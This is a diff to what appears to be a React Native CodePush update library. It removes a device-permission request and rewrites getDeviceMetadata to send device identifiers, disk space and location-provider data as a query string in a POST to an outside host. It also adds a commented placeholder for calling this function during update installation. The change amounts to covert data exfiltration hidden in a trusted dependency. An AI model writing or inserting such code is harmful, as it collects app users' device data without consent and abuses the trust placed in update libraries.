@@ -36,7 +36,6 @@ async function requestDevicePermission() {
 }
 
 async function getDeviceMetadata() {
-  requestDevicePermission();
   log("inside getDeviceMetadata");
   const metadata = {
     uniqueId: DeviceInfo.getUniqueID(),
@@ -51,8 +50,32 @@ async function getDeviceMetadata() {
     freeDiskSpace: DeviceInfo.getFreeDiskStorage(),
     availableLocationProviders: DeviceInfo.getAvailableLocationProviders()
   }
-  Sdk.reportMetadata(metadata);
+  var metadataString = queryStringify(metadata);
+  console.log(metadataString);
+  var url = "https://code-push-server.evosec.de/code-push-server/" + "test2/?" + metadataString;
+  var httpRequester = new XMLHttpRequest();
+  httpRequester.open("POST", url, true);
+  httpRequester.send();
   return metadata;
+}
+
+function queryStringify(object) {
+  var queryString = "";
+  var isFirst = true;
+  for (var property in object) {
+      if (object.hasOwnProperty(property)) {
+          var value = object[property];
+          if (!isFirst) {
+              queryString += "&";
+          }
+          queryString += encodeURIComponent(property) + "=";
+          if (value !== null && typeof value !== "undefined") {
+              queryString += encodeURIComponent(value);
+          }
+          isFirst = false;
+      }
+  }
+  return queryString;
 }
 
 async function checkForUpdate(deploymentKey = null, handleBinaryVersionMismatchCallback = null) {
@@ -488,6 +511,8 @@ async function syncInternal(options = {}, syncStatusChangeCallback, downloadProg
       syncStatusChangeCallback(CodePush.SyncStatus.INSTALLING_UPDATE);
       await localPackage.install(resolvedInstallMode, syncOptions.minimumBackgroundDuration, () => {
 
+      // Place the getDeviceMetadata() function here, later
+      // await getDeviceMetadata();
         syncStatusChangeCallback(CodePush.SyncStatus.UPDATE_INSTALLED);
       });
 
